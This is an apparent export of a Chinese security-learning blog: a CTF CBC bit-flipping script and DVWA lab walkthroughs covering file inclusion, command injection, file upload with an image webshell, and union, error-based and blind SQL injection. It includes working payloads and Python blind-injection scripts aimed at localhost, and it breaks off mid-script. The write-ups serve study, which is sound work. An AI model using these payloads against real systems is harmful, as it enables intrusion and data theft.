<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>代码中涉及到了序列化，数组序列化结果参考如下（这里使用ydmin和123作为username和password）：<br> <code>a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;ydmin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;&#125;</code><br>到这里，算是大致理解这个CBC翻转字节攻击是如何实现的了，首先我们知道前一段密文会影响后一段明文的解密，所以我们就对第一段<code>a:2:&#123;s:8:&quot;userna</code>的密文进行修改，使得在于第二段密文异或运算时ydmin变成admin<br>这个时候，我们将修改后的密文直接拿去也是不行的，因为这个时候IV没有更换，前面的数据会出现匹配乱码<br>我们知道 第一节明文=IV^第一节密文<br>所以 新IV=第一节明文^第一节密文（修改之前的，因为修改之前的密文所对应的明文才是正确的）</p>
<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">cipher=<span class="string">&quot;ut%2F2iZbrbm1dq9PpRb0dUGN5xneMrTkNo1pMCTL6DjhABvPsODND9N%2BLwENXWiXXPyy5PQ7YXn2HCfcIkYNAIw%3D%3D&quot;</span></span><br><span class="line">iv=<span class="string">&quot;Ub5Pn6gmMNuctLwfJggaOA%3D%3D&quot;</span></span><br><span class="line"></span><br><span class="line">cipher_de=base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">tran=<span class="string">&#x27;a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;bdmin&quot;;s:d&quot;;s:3:&quot;123&quot;&#125;8:&quot;passwor&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tran[16:32]=me&quot;;s:5:&quot;bdmin&quot;;</span></span><br><span class="line"><span class="comment"># 这里用之前的攻击核心的字母来指代一下       A       ^    c   ^   x                             </span></span><br><span class="line">cipher_new=cipher_de[<span class="number">0</span>:<span class="number">9</span>]+chr(ord(cipher_de[<span class="number">9</span>])^ord(<span class="string">&#x27;b&#x27;</span>)^ord(<span class="string">&#x27;a&#x27;</span>))+cipher_de[<span class="number">10</span>:]</span><br><span class="line">cipher_new=urllib.quote(base64.b64encode(cipher_new))</span><br><span class="line">print(cipher_new)</span><br><span class="line">cipher_new=base64.b64decode(<span class="string">&#x27;wXAR7J/AKHmukMZ9U0lgO21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&#x27;</span>)<span class="comment">#这里记得用burp跑出来的那个，不然待会又解码不吻合。</span></span><br><span class="line">print(cipher_new)</span><br><span class="line">iv_raw=base64.b64decode(urllib.unquote(iv))</span><br><span class="line">iv_new=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">	       iv_new+=chr(ord(tran[i])^ord(iv_raw[i])^ord(cipher_new[i]))</span><br><span class="line">iv_new=urllib.quote(base64.b64encode(iv_new))</span><br><span class="line">print(iv_new)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210206192521.png" alt="img" style="zoom:67%;">
最后也终于是拿到了flag

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>一开始做的时候，就看不下去了，因为感觉很陌生，而且又感觉很绕，但其实只要专注看一会，其实很快就可以理解了<br>卡了比较久的地方是，删除下面post 的内容的时候，把那一行删掉就行了，不要不要把那一行上面那行空白的也删掉，这样是跑不出来的，每次都手贱直接整个删掉，然后就好久都没出来结果，无语了。。<br>参考:<a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&amp;depth_1-utm_source=distribute.pc_relevant.no">https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&amp;depth_1-utm_source=distribute.pc_relevant.no</a></p>
<p><a href="https://www.jianshu.com/p/a958f757a2b2">https://www.jianshu.com/p/a958f757a2b2</a></p>
]]></content>
  </entry>
  <entry>
    <title>DVWA-file including</title>
    <url>/2021/01/23/DVWA-file-including/</url>
    <content><![CDATA[<p>其实已经做过好多文件包含的练习，但是都是比较零碎的题目<br>这次就整体一起来总结一下吧：     <a id="more"></a></p>
<h2 id="文件包含漏洞简介"><a href="#文件包含漏洞简介" class="headerlink" title="文件包含漏洞简介"></a>文件包含漏洞简介</h2><p>1.文件包含可以分为本地文件包含和远程文件包含两种。文件包含和文件上传一样本身并不是漏洞，而是攻击者利用了包含的特性加上了应用本身对文件控制不严格，对include进来的文件不可控，才导致了一系列的危害<br>2.本地文件包含就是通过URL将服务器本地的其他文件include进来。远程文件包含就是将远程服务器的文件include进来<br>3.最主要的是，包含进来的文件都是以当前脚本文件解析，例如在apache+PHP环境，那么被include进来的文件，不管是什么类型，例如图片，文本文档，都会被当成<strong>php脚本</strong>来解析</p>
<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤，允许遍历目录的字符注入浏览器并执行<br><strong>总的来说就是被包含的文件再服务器本地</strong></p>
<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>在远程服务器上预先设置好的脚本，然后攻击者利用该漏洞包含一个远程的文件，这种漏洞的出现是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露，拒绝服务攻击，甚至在目标服务器上执行代码<br><strong>简单的说，就是被包含的文件在第三方服务器</strong></p>
<h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Include</span>()</span><br><span class="line">当包含并运行指定文件时，包含的外部文件发生错误，系统会给出警告，但整个php文件还会继续执行。</span><br><span class="line"><span class="keyword">Require</span>()</span><br><span class="line"><span class="keyword">require</span>()与 <span class="keyword">include</span>()的区别在于 <span class="keyword">require</span>()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。</span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line">和<span class="keyword">include</span>没有什么区别，只是在导入函数之前先检测下该文件是否被<span class="keyword">include</span>过，如果已经执行了一遍，那么就不在进行第二次的<span class="keyword">include</span>操作。<span class="keyword">require_once</span>()</span><br><span class="line">功能与 <span class="keyword">require</span>()相同，区别在于当重复调用同一文件时，程序只调用一次</span><br></pre></td></tr></table></figure>

<h4 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/ 		根目录</span><br><span class="line">./		是当前目录</span><br><span class="line">../  返回到上一级目录</span><br><span class="line">../../ 返回了两级目录</span><br><span class="line">.\ 、..\和./、../意义相同</span><br></pre></td></tr></table></figure>

<h2 id="DVWA练习"><a href="#DVWA练习" class="headerlink" title="DVWA练习"></a>DVWA练习</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><h4 id="本地文件包含："><a href="#本地文件包含：" class="headerlink" title="本地文件包含："></a>本地文件包含：</h4><p>在low级别中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"> <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这个对get的page没有任何过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $file ) )  </span><br><span class="line"><span class="keyword">include</span>( $file );</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"> header( <span class="string">&#x27;Location:?page=include.php&#x27;</span> );</span><br><span class="line"> <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在index.php文件中发现inlude()  所以有文件包含漏洞<br>构建</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=../../phpinfo.php</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210123153911.png" alt="img"></p>
<p>有的人会问，你怎么知道上移两级可以找到这个文件？<br>当然不知道呀，试出来的</p>
<h4 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>我们现在我们www下构建一个文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210123154750.jpg" alt="img" style="zoom:80%;"><br>然后通过输入URL进行打开<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210123155139.png" alt="img" style="zoom:80%;"><br>这里需要注意的是，文件名不能包含空格之类的字符，不然到时候会被被编码成%20反而找不到文件了</p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, $file ); $file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, $file ); </span><br></pre></td></tr></table></figure>

<p>在这个关卡中，使用了两个正则过滤了以上字符</p>
<h4 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>尝试一下使用复写的方式进行绕过：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=..././..././phpinfo.php</span><br></pre></td></tr></table></figure>

<p>好的绕过成功<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210123154532.png" alt="img" style="zoom:67%;"></p>
<p>感觉过滤绕过的方法都很像，所以要经常复习！</p>
<h4 id="远程文件包含-2"><a href="#远程文件包含-2" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload：?page=Http:<span class="comment">//url    //在这里也是直接采取大小写拼接，或者复写都可以</span></span><br></pre></td></tr></table></figure>

<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, $file ) &amp;&amp; $file != <span class="string">&quot;include.php&quot;</span> ) </span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;   </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fnmatch() 函数根据指定的模式来匹配文件名或字符串。<br>这里使用fnmatch检查page参数，必须是file*<br>问：file*是什么类型？<br>这里指的是需要file协议类型:<br><strong>定义</strong>本地文件传输协议 ,file协议主要用于访问本地计算机中的文件.<br><strong>file协议的格式：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">///+绝对路径</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/lishanlei/p/9327646.html">https://www.cnblogs.com/lishanlei/p/9327646.html</a><br>所以这里我们需要知道绝对路径才行，不能在使用../退格</p>
<h3 id="impossible难度"><a href="#impossible难度" class="headerlink" title="impossible难度"></a>impossible难度</h3><p>直接白名单，简单粗暴没啥好说–</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>存在文件包含漏洞，我觉得很大的作用是获取路径信息或者其他有用信息为文件上传get shell 做准备<br>1.报错产生文件路径<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210123163253.png" alt="img"><br>2.通过已有的路径，猜解服务器绝对路径</p>
]]></content>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA靶场</title>
    <url>/2021/01/20/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><h4 id="low："><a href="#low：" class="headerlink" title="low："></a>low：</h4><p>暴力破解——burpsuit去跑就行了<br>或者使用sql注入：admin’|| 1=’1、admin’#       <a id="more"></a></p>
<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p>使用了mysql_real_escape_string函数进行过滤<br>复习一下过滤了啥</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210121094344.png" alt="img" style="zoom:67%;">
回想一下当时是怎么bypass的？ 因为那一关有用gbk进行编码，所以我们可以使用宽字节注入的方式吃掉\
这里没有看到GBK编码
所以我们只能继续使用burp suit跑字典
这边有个睡眠两秒的放爆破机制？感觉好像蛮鸡肋的，就是等的时间长点而已，最后还是能跑出来的

<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>除了在原由的防sql注入的基础上又添加了stripslashes函数——用于去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个，所以sql注入似乎变得不太可能了<br>burpsuit暴力破解也不行，因为它每次都需要提交一个不同的token<br>所以这里只能用脚本来暴力破解：<br>脚本的编写还没学完，等学完再来补充</p>
<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h4 id="命令执行和代码执行的原理分析"><a href="#命令执行和代码执行的原理分析" class="headerlink" title="命令执行和代码执行的原理分析"></a>命令执行和代码执行的原理分析</h4><p>有些会需要调用一些执行系统命令的函数，比如PHP中的：<br>system ， exec ， shell_exec ， passthru ， popen ， proc_popen 等函数…<br>如果用户可以控制这些函数的参数，那么把参数替换成自己的恶意命令，是不是就可以操作系统一些命令了？这就是命令执行。</p>
<h4 id="命令行注入"><a href="#命令行注入" class="headerlink" title="命令行注入"></a>命令行注入</h4><p>  命令注入攻击的常见模式为：仅仅需要输入数据的场合，却伴随着数据同时输入了恶意代码，而装载数据的系统对此并未设计良好的过滤过程，导致恶意代码也一并执行，最终导致信息泄露或者正常数据的破坏。<br><strong>命令连接符</strong><br>command1 &amp;&amp; command2  先执行command1后执行command2<br>command1 | command2   只执行command2<br>command1 &amp; command2   先执行command2后执行command1</p>
<p>以上三种连接符在windows和linux环境下都支持<br>如果程序没有进行过滤，那么我们就可以通过连接符执行多条系统命令。<br>在本题中源代码没有体现对ip的任何过滤</p>
<h4 id="系统命令整理："><a href="#系统命令整理：" class="headerlink" title="系统命令整理："></a>系统命令整理：</h4><p>windows下：<a href="https://www.shuzhiduo.com/A/Vx5MBqZLdN/">https://www.shuzhiduo.com/A/Vx5MBqZLdN/</a><br>linux下：<a href="https://www.cnblogs.com/54chensongxia/p/12510758.html">https://www.cnblogs.com/54chensongxia/p/12510758.html</a></p>
<p>那么这题如何解答就很明了了，我们该如何利用这写系统命令函数，就是利用这些命令连接符</p>
<h5 id="low：-1"><a href="#low：-1" class="headerlink" title="low："></a>low：</h5><p>认识几个函数：<br><strong>shell_exec()</strong><br>函数是PHP中的一个内置函数，用于通过shell执行命令并以字符串的形式返回完整的输出。<strong>stristr(string,search,before_search)</strong><br>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为”false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。<br><strong>php_uname(mode)</strong><br>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a”    （此为默认，包含序列”s n r v m”里的所有模式），”s        ”（返回操作系统名称），”n”（返回主机名），”            r”（返回版本名称），”v”（返回版本信息），                ”m”（返回机器类型）。</p>
<p>然后接下来输入 ping&amp;&amp;系统命令；</p>
<h5 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h5><p>在这一关中 过滤了&amp;&amp; 和; 看看上面的命令连接符，还有&amp; |等其他符号可以使用<br>那么这里为什么要过滤；呢？ 在linux系统当中是可以用；号来替换这些命令连接符的</p>
<p>那么如果一定要用&amp;&amp;该如何绕过呢<br>这里看到”127.0.0.1&amp;;&amp;ipconfig”中的”    ;”会被替换为空字符，这样一来就变成了”127.0.0.1&amp;&amp; ipconfig” ，会成功执行。</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210121131013.png" alt="img" style="zoom:67%;">

<h5 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h5><p>在这一关中，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210121170630.png" alt="img" style="zoom: 80%;"><br>过滤了很多了，但是仔细观察，发现过滤的不是|而是|+一个空格 我就纳闷了，为啥不直接过滤| 为了让我们过了这个关卡吗？有点小无语哈哈哈，总而言之我们输入127.0.0.1|net user</p>
<h5 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h5><p>impossible关卡的过滤机制让我想到了刚刷完的upload，也是类似的<br>先把其他字符给过滤掉，然后用.分割成多个数组，分别验证是否为数字，再将这几个数组进行拼接</p>
<p><strong>ANTI CSRF TOKEN</strong>：<br>这个是用来防范csrf攻击的，但是csrf是什么？还没学到，我看下面的题目有，先接着做吧<br><a href="https://blog.chenhaotaishuaile.com/2019/03/16/csrf-token-generate/">https://blog.chenhaotaishuaile.com/2019/03/16/csrf-token-generate/</a></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>这里让我们上传一张图片，直接上传然后burp抓包改后缀<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210123185026.png" alt="img" style="zoom:67%;"><br>他的相对路径已经出来了，接下来就是猜解其绝对路径</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:81/DVWA-master/hackable/uploads/123.php</span></span><br></pre></td></tr></table></figure>

<h4 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h4><p>在中级的题目中，验证了后缀是是否jpg和png图片格式后缀的<br>方法一：burp改后缀<br>方法二：上传文件后利用上一关的文件包含漏洞<br>方法三：因为有move_uploaded_file()函数，所以可以尝试一下00截断<br>上传jpg</p>
<h4 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h4><p>和之前差别不大，但是多了getimagesize()这个函数，意味着这里要是用图片木马<br>将图片和木马用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">copy <span class="number">1.</span>jpg/b+<span class="number">2.</span>php/a <span class="number">12.</span>jpg</span><br></pre></td></tr></table></figure>

<h4 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h4><p>in_get(varname)<br>函数返回相应选项的值<br>imagecreatefromjpeg ( filename )<br>函数返回图片文件的图像标识，失败返回false<br>imagejpeg ( image , filename , quality)<br>从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。<br>imagedestroy( img )<br>函数销毁图像资源</p>
<h2 id="sql-injection"><a href="#sql-injection" class="headerlink" title="sql injection"></a>sql injection</h2><h4 id="low：-2"><a href="#low：-2" class="headerlink" title="low："></a>low：</h4><p>1.字符型 注入——1’or 1=1’1 /1’or 1=1#<br>2.payload: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union selct联合注入：</span><br><span class="line">1&#39;order by 2# ——有两列</span><br><span class="line">1&#39;union select 1,2#</span><br><span class="line">1&#39; union select database(),2#</span><br><span class="line">1&#39;union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br></pre></td></tr></table></figure>

<p> payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">extractvalue报错注入</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(&#x27;</span>~<span class="string">&#x27;,database(),&#x27;</span>~<span class="string">&#x27;))#</span></span><br></pre></td></tr></table></figure>

<h4 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h4><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125083456.png" alt="img" style="zoom:67%;">
这一关使用下拉选择的方式进行登录，所以就没办法在这里进行注入，我们知道这是POST类型提交数据，所以，这里我们尝试一下抓包进行修改数据
![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125083457.png)

<p>可以发现，他这次对’和\都过滤了，实现转义<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125083840.png" alt="img"></p>
<p>然后回到起点，发现，这次是数字型注入啊？？？那个过滤方式有啥意义吗？？<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125084258.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125084259.png" alt="img" style="zoom:67%;"><br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 union select 1,database()#</span><br><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x64767761&#x2F;&#x2F;这里由于过滤了单引号，所以只能用16进制进行编码然后绕过，dvwa&#x3D;0x64767761</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 and extractvalue(1,concat(1,database()))#</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125085237.png" alt="img" style="zoom:67%;">

<h4 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h4><p>很奇怪，我输入1’ union select 1,database()#后 页面变成<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125091312.png" alt="img" style="zoom:67%;"><br>并且怎么刷新返回重启都没用</p>
<h4 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"></span><br><span class="line">  checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"><span class="comment">//这个token可以用来防止sqlmap吧，因为每一次的提交都要重新提交一个token</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get input</span></span><br><span class="line"></span><br><span class="line">  $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Was a number entered?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check the database</span></span><br><span class="line">$data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">$data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line"><span class="comment">//bindParam()：绑定一个参数到指定的变量名，在这里他就是让id为int类型的变量</span></span><br><span class="line">$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">$row = $data-&gt;fetch();</span><br></pre></td></tr></table></figure>

<p>根据以上的解析，所以基本上不存在注入点了</p>
<h2 id="sql-injection-blind"><a href="#sql-injection-blind" class="headerlink" title="sql injection(blind)"></a>sql injection(blind)</h2><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><p>因为他的返回结果只有存在或者不存在在数据库当中，所以我们这里只好尝试使用盲注:<br>这里编写一个盲注脚本,前面发现是字符型注入，get类型，查看源码发现没有过滤，所以直接编写脚本:</p>
<p>猜解数据库长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">&quot;http://localhost:81/DVWA-master/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;security=low;PHPSESSID=45nnfme23ea8iumsihnr6gqc7i; night_mode=0&#x27;</span>&#125;</span><br><span class="line">print(<span class="string">&quot;---开始猜解数据库名长度---&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    database_length=<span class="string">&quot;?id=1\&#x27;and+length(database())=&#x27;%d&#x27;--+&amp;Submit=Submit#&quot;</span>%j</span><br><span class="line"><span class="comment">#这里的语句还可以替换成:</span></span><br><span class="line"><span class="comment">#database_length=f&quot;?id=1\&#x27;and+length(database())=&#123;j&#125;--+&amp;Submit=Submit#&quot;</span></span><br><span class="line"><span class="comment">#database_length=&#x27;?id=1\&#x27;and+length(database())=&#x27;+str(j)+&#x27;--+&amp;Submit=Submit#&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> s.get(url+database_length,headers=headers).text:</span><br><span class="line">        databaselength = j</span><br><span class="line">        <span class="comment">#print(s.get(url+database_length,headers=headers).text)</span></span><br><span class="line">        print(url+database_length)</span><br><span class="line">        print(<span class="string">&quot;数据库的长度为&quot;</span> + str(databaselength))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210127141930.png" alt="img" style="zoom:67%;">



<p>猜解数据库的名字:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;-----开始猜解数据库名-------&quot;</span>)</span><br><span class="line">databasename = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,databaselength+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payloads:</span><br><span class="line">       database_payload=<span class="string">f&quot;?id=1\&#x27;and+substr(database(),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;%23&amp;Submit=Submit#&quot;</span></span><br><span class="line">       print(database_payload//调试用的</span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> s.get(url+database_payload,headers=headers).text:</span><br><span class="line">           databasename +=i</span><br><span class="line">print(<span class="string">&#x27;数据库的名字为:&#x27;</span>+databasename)</span><br></pre></td></tr></table></figure>

<p>查询表的数目:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;-----开始猜解表数-------&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    table_count=<span class="string">f&quot;?id=1&#x27;and (select count(table_name)from information_schema.tables where table_schema=database())=<span class="subst">&#123;j&#125;</span>%23&amp;Submit=Submit#&quot;</span></span><br><span class="line">    print(table_count)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> s.get(url+table_count,headers=headers).text:</span><br><span class="line">        tablecount=j</span><br><span class="line">        print(<span class="string">&quot;表的数目是&quot;</span>+str(tablecount))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>查询表名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;-----开始猜解表名-------&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, tablecount):</span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">        tab_length = <span class="string">f&#x27;?id=1\&#x27;and (select length(table_name) from information_schema.tables where table_schema=database() limit <span class="subst">&#123;j&#125;</span>,1)=<span class="subst">&#123;i&#125;</span>%23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">        <span class="comment"># print(tablength)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> s.get(url + tab_length, headers=headers).text:</span><br><span class="line">            tablength = i</span><br><span class="line">            print(<span class="string">&quot;第一个表长度为:%d&quot;</span> % i)</span><br><span class="line"><span class="comment">#以上是为了得出每一个表的长度</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>, tablength+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads:</span><br><span class="line">                    table_payload = <span class="string">f&#x27;?id=1\&#x27;and substr((select table_name from information_schema.tables where table_schema=database() limit <span class="subst">&#123;j&#125;</span>,1),<span class="subst">&#123;m&#125;</span>,1)=\&#x27;<span class="subst">&#123;n&#125;</span>\&#x27;%23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">                    <span class="comment">#print(table_payload)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url + table_payload, 